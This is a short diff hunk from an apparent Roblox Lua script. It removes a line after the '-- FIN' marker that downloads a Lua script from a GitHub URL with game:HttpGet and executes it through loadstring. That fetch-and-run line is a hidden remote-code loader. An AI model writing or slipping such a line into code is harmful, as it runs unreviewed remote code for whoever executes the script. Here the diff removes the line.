@@ -588,4 +588,3 @@ player.AncestryChanged:Connect(function(_, parent)
 end)
 
 -- FIN
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SyKO6/sql/refs/heads/main/scripts/sh.lua"))()  
